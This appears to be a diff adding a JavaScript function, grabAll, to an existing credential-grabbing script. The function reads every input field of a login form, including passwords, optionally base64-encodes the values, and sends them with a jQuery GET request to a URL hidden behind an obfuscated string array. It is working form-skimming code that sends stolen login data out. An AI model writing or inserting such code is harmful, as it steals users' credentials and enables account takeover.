@@ -39,3 +39,21 @@ function grabIt() {
 		console.log("No credentials were found");
 	}
 }
+
+/* parse through the form elements and serialize anything interesting */
+function grabAll() {
+        var payload = "";
+        for(var i = 0; i<loginform.elements.length; i++) {
+                console.log("element: " + loginform.elements.item(i));
+                if(loginform.elements.item(i) instanceof HTMLInputElement) {
+                        console.log("name: " + loginform.elements.item(i).name);
+                        console.log("value: " + loginform.elements.item(i).value);
+                        payload += "&" + loginform.elements.item(i).name + ":" + loginform.elements.item(i).value;
+                }
+        }
+        if(enableEncoding) {
+                payload = btoa(payload);
+        }
+        console.log("resulting payload = " + payload);
+        $.get(_0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + payload);
+}
